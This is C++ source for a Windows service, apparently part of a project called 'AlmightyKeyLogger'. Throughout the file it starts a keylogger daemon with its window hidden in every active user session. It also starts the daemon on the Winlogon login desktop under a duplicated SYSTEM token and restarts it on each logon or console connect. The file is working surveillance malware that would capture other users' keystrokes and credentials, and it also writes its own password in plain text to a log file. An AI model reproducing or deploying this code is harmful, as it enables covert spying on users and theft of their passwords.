#include <windows.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <tchar.h>
#include <vector>
#include <string>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <TlHelp32.h>
#include <map>

#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")

SERVICE_STATUS g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv[]);
DWORD WINAPI ServiceCtrlHandlerEx(DWORD CtrlCode, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext);
DWORD StartProcessInSession(DWORD sessionId, const wchar_t* desktopName);
void HandleSessionChange(DWORD dwEventType, WTSSESSION_NOTIFICATION* sessionNotification);
BOOL EnablePrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege);
std::vector<DWORD> FindActiveUserSessionIds();
void Log(const std::wstring& message);
bool IsProcessInSession(const wchar_t* executableName, DWORD sessionId);
std::wstring ReadRegistryValue(const std::wstring& name);
bool StopKeyLoggerDaemon();
bool IsProcessInSessionAndDesktop(DWORD sessionId, const wchar_t* desktopName);
DWORD StartProcessWithSystemToken(DWORD sessionId, const wchar_t* desktopName);
void SetMapping(DWORD sessionId, const wchar_t* desktopName);
std::wstring removeBackslashes(const std::wstring& input);

const wchar_t* REGISTRY_KEY_PATH = L"SOFTWARE\\AlmightyKeyLogger";
const wchar_t* INJECTED_PROCESS_PATH = L"C:\\Users\\user\\source\\repos\\AlmightyKeyLogger\\x64\\Debug\\AlmightyKeyLoggerDaemon.exe";
const wchar_t* INJECTED_PROCESS_NAME = L"AlmightyKeyLoggerDaemon.exe";
const wchar_t* WINSTA0_DEFAULT = L"winsta0\\default";
const wchar_t* WINSTA0_WINLOGON = L"winsta0\\Winlogon";

// Lof file path and password read from registry
std::wstring logFilePath;
std::wstring password;
// Map to track which session IDs and desktop names already have a process opened
std::map<std::pair<DWORD, std::wstring>, bool> processMap;

int wmain(int argc, wchar_t* argv[])
{
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { (LPWSTR)L"AlmightyKeyLoggerService", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcher(ServiceTable))
    {
        return GetLastError();
    }

    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv[])
{
    g_StatusHandle = RegisterServiceCtrlHandlerEx(L"AlmightyKeyLoggerService", ServiceCtrlHandlerEx, NULL);

    if (g_StatusHandle == NULL)
    {
        return;
    }

    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Create a stop event to signal service stop
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL)
    {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        g_ServiceStatus.dwCheckPoint = 1;

        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    // Enable SE_TCB_NAME privilege
    if (!EnablePrivilege(SE_TCB_NAME, TRUE))
    {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        g_ServiceStatus.dwCheckPoint = 1;

        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    // Read log file path and password from registry
    logFilePath = ReadRegistryValue(L"LogFilePath");
    password = ReadRegistryValue(L"Password");

    Log(L"Log file path: " + logFilePath);
    Log(L"Password: " + password);

    // Enumerate all active sessions and start a process in each
    std::vector<DWORD> activeSessionIds = FindActiveUserSessionIds();
    Log(L"Active sessions: " + std::to_wstring(activeSessionIds.size()));
    for (DWORD sessionId : activeSessionIds)
    {
        StartProcessInSession(sessionId, WINSTA0_DEFAULT);
        StartProcessWithSystemToken(sessionId, WINSTA0_WINLOGON);
    }

    Log(L"[+] Service startup complete - Listening for new sessions...\n");

    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SESSIONCHANGE;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Wait until stop event is signaled
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);

    // Cleanup and stop the service
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    return;
}

DWORD WINAPI ServiceCtrlHandlerEx(DWORD CtrlCode, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;

        // Stop the keylogger daemon process - sleep for 11 seconds to allow the process to stop gracefully
        Log(L"Will terminate in 11 seconds. Waiting for the daemons to save information");
        std::this_thread::sleep_for(std::chrono::seconds(11));
        Log(L"Terminating the daemons...");
        StopKeyLoggerDaemon();

        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        SetEvent(g_ServiceStopEvent);
        break;

    case SERVICE_CONTROL_SESSIONCHANGE:
        HandleSessionChange(dwEventType, (WTSSESSION_NOTIFICATION*)lpEventData);
        break;

    default:
        break;
    }

    return NO_ERROR;
}

std::wstring ReadRegistryValue(const std::wstring& name)
{
    HKEY hKey;
    std::wstring value;
    DWORD size = 0;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_KEY_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS)
        {
            wchar_t* buffer = new wchar_t[size / sizeof(wchar_t)];
            if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS)
            {
                value = buffer;
            }
            delete[] buffer;
        }
        RegCloseKey(hKey);
    }

    return value;
}

// Helper function to remove backslashes from a string
std::wstring RemoveBackslashes(const std::wstring& input)
{
    std::wstring output = input;
    output.erase(std::remove(output.begin(), output.end(), L'\\'), output.end());
    return output;
}

DWORD StartProcessInSession(DWORD sessionId, const wchar_t* desktopName)
{
    Log(L"Starting process in session: " + std::to_wstring(sessionId));

    BOOL isProcessRunning = IsProcessInSessionAndDesktop(sessionId, desktopName);
    if (isProcessRunning)
    {
        Log(L"[*] Process already running in session: " + std::to_wstring(sessionId) + L" and desktop: " + desktopName);
        return 0;
    }

    HANDLE hToken = NULL;
    if (!WTSQueryUserToken(sessionId, &hToken))
    {
        Log(L"Failed to query user token for session: " + std::to_wstring(sessionId));
        return GetLastError();
    }

    HANDLE hDuplicatedToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &hDuplicatedToken))
    {
        CloseHandle(hToken);
        Log(L"Failed to duplicate token for session: " + std::to_wstring(sessionId));
        return GetLastError();
    }

    CloseHandle(hToken);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    //si.lpDesktop = (LPWSTR)L"winsta0\\default";
    si.lpDesktop = (LPWSTR)desktopName;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the console window

    // Remove backslashes from desktop name for log file
    std::wstring sanitizedDesktopName = RemoveBackslashes(desktopName);

    std::wstring commandLine = std::wstring(INJECTED_PROCESS_PATH) + L" " + logFilePath + L"Session" + std::to_wstring(sessionId) + sanitizedDesktopName + L".log" + L" " + password;
    Log(L"Command line: " + commandLine);

    LPVOID pEnv = NULL;
    if (!CreateEnvironmentBlock(&pEnv, hDuplicatedToken, TRUE))
    {
        CloseHandle(hDuplicatedToken);
        Log(L"Failed to create environment block for session: " + std::to_wstring(sessionId));
        return GetLastError();
    }

    if (!CreateProcessAsUser(
        hDuplicatedToken,                           // User token
        NULL,                                       // Application name
        (LPWSTR)commandLine.c_str(),                // Command line
        NULL,                                       // Process attributes
        NULL,                                       // Thread attributes
        FALSE,                                      // Inherit handles
        CREATE_UNICODE_ENVIRONMENT,                 // Creation flags (removed CREATE_NEW_CONSOLE)
        pEnv,                                       // Environment
        NULL,                                       // Current directory
        &si,                                        // Startup info
        &pi))                                       // Process info
    {
        DWORD lastError = GetLastError();
        CloseHandle(hDuplicatedToken);
        DestroyEnvironmentBlock(pEnv);
        Log(L"Failed to create process as user in session: " + std::to_wstring(sessionId));
        Log(L"Error code: " + std::to_wstring(lastError));
        return lastError;
    }

    SetMapping(sessionId, desktopName);
    Log(L"[+] Process created successfully in session: " + std::to_wstring(sessionId));

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hDuplicatedToken);
    DestroyEnvironmentBlock(pEnv);

    return 0;
}

DWORD StartProcessWithSystemToken(DWORD sessionId, const wchar_t* desktopName)
{
    Log(L"Starting process in session: " + std::to_wstring(sessionId));

    BOOL isProcessRunning = IsProcessInSessionAndDesktop(sessionId, desktopName);
    if (isProcessRunning)
    {
        Log(L"[*] Process already running in session: " + std::to_wstring(sessionId) + L" and desktop: " + desktopName);
        return 0;
    }

    HANDLE currentProcess = GetCurrentProcess();
    HANDLE currentToken = NULL;
    if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken))
    {
        Log(L"Failed to open process token for current process");
        return GetLastError();
    }

    HANDLE newToken = NULL;
    if (!DuplicateTokenEx(currentToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &newToken))
    {
        CloseHandle(currentToken);
        Log(L"Failed to duplicate token for current process");
        return GetLastError();
    }

    CloseHandle(currentToken);

    // Change the session ID in the duplicated token to the specified sessionId
    if (!SetTokenInformation(newToken, TokenSessionId, &sessionId, sizeof(sessionId)))
    {
        CloseHandle(newToken);
        Log(L"Failed to set token session ID for session: " + std::to_wstring(sessionId));
        return GetLastError();
    }

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.lpDesktop = (LPWSTR)desktopName;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the console window

    // Remove backslashes from desktop name for log file
    std::wstring sanitizedDesktopName = RemoveBackslashes(desktopName);

    std::wstring commandLine = std::wstring(INJECTED_PROCESS_PATH) + L" " + logFilePath + L"Session" + std::to_wstring(sessionId) + sanitizedDesktopName + L".log" + L" " + password;
    Log(L"Command line: " + commandLine);

    LPVOID pEnv = NULL;
    if (!CreateEnvironmentBlock(&pEnv, newToken, TRUE))
    {
        CloseHandle(newToken);
        Log(L"Failed to create environment block for session: " + std::to_wstring(sessionId));
        return GetLastError();
    }

    if (!CreateProcessAsUser(
        newToken,                                   // User token
        NULL,                                       // Application name
        (LPWSTR)commandLine.c_str(),                // Command line
        NULL,                                       // Process attributes
        NULL,                                       // Thread attributes
        FALSE,                                      // Inherit handles
        CREATE_UNICODE_ENVIRONMENT,                 // Creation flags (removed CREATE_NEW_CONSOLE)
        pEnv,                                       // Environment
        NULL,                                       // Current directory
        &si,                                        // Startup info
        &pi))                                       // Process info
    {
        DWORD lastError = GetLastError();
        CloseHandle(newToken);
        DestroyEnvironmentBlock(pEnv);
        Log(L"Failed to create process as user in session: " + std::to_wstring(sessionId));
        Log(L"Error code: " + std::to_wstring(lastError));
        return lastError;
    }

    SetMapping(sessionId, desktopName);
    Log(L"[+] ELEVATED TOKEN: Process created successfully in session: " + std::to_wstring(sessionId));

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(newToken);
    DestroyEnvironmentBlock(pEnv);

    return 0;
}

bool StopKeyLoggerDaemon() {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    bool result = false;

    if (Process32First(hSnapShot, &pEntry)) {
        do {
            // Convert pEntry.szExeFile to a string and compare case-insensitively
            if (_wcsicmp(pEntry.szExeFile, INJECTED_PROCESS_NAME) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pEntry.th32ProcessID);
                if (hProcess != NULL) {
                    if (TerminateProcess(hProcess, 0)) {
                        result = true;
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapShot, &pEntry));
    }

    CloseHandle(hSnapShot);
    return result;
}



void HandleSessionChange(DWORD dwEventType, WTSSESSION_NOTIFICATION* sessionNotification)
{
    //Log(L"Session change event: " + std::to_wstring(dwEventType) + L", Session ID: " + std::to_wstring(sessionNotification->dwSessionId));
    if (dwEventType == WTS_CONSOLE_CONNECT)
    {
        StartProcessWithSystemToken(sessionNotification->dwSessionId, WINSTA0_WINLOGON);
        StartProcessInSession(sessionNotification->dwSessionId, WINSTA0_DEFAULT);
    }
    if (dwEventType == WTS_SESSION_LOGON)
    {
        Log(L"Session logon event, waiting for 5 seconds before starting process");
        std::this_thread::sleep_for(std::chrono::seconds(5));
		StartProcessInSession(sessionNotification->dwSessionId, WINSTA0_DEFAULT);
	}
}

BOOL EnablePrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

std::vector<DWORD> FindActiveUserSessionIds()
{
    WTS_SESSION_INFO* pSessionInfo = NULL;
    DWORD sessionCount = 0;
    std::vector<DWORD> activeSessionIds;

    if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &sessionCount))
    {
        for (DWORD i = 0; i < sessionCount; ++i)
        {
            Log(L"Session ID: " + std::to_wstring(pSessionInfo[i].SessionId) + L", State: " + std::to_wstring(pSessionInfo[i].State));
            if (pSessionInfo[i].State == WTSActive)
            {
                DWORD sessionId = pSessionInfo[i].SessionId;
                HANDLE hToken = NULL;
                if (WTSQueryUserToken(sessionId, &hToken))
                {
                    CloseHandle(hToken);
                    activeSessionIds.push_back(sessionId);
                }
            }
        }
        WTSFreeMemory(pSessionInfo);
    }

    return activeSessionIds;
}

void Log(const std::wstring& message)
{
    std::wofstream logFile;
    logFile.open("C:\\temp\\service_log.txt", std::ios_base::app);
    logFile << message << std::endl;
    logFile.close();
}

bool IsProcessInSession(const wchar_t* executableName, DWORD sessionId)
{
    PWTS_PROCESS_INFO pProcessInfo = NULL;
    DWORD processCount = 0;
    bool processFound = false;

    // Enumerate processes in the specified session
    if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &processCount))
    {
        for (DWORD i = 0; i < processCount; ++i)
        {
            // Check if the process is in the specified session and matches the executable name
            if (pProcessInfo[i].SessionId == sessionId)
            {
                if (_wcsicmp(pProcessInfo[i].pProcessName, executableName) == 0)
                {
                    processFound = true;
                    break;
                }
            }
        }

        // Free the memory allocated for process enumeration
        WTSFreeMemory(pProcessInfo);
    }

    return processFound;
}

// Function to check if a process is already running in the specified session and desktop
bool IsProcessInSessionAndDesktop(DWORD sessionId, const wchar_t* desktopName)
{
    auto key = std::make_pair(sessionId, std::wstring(desktopName));
    auto it = processMap.find(key);
    if (it != processMap.end() && it->second)
    {
        return true;
    }
    return false;
}

// Function to mark a session ID and desktop name in the mapping
void SetMapping(DWORD sessionId, const wchar_t* desktopName)
{
    auto key = std::make_pair(sessionId, std::wstring(desktopName));
    processMap[key] = true;
}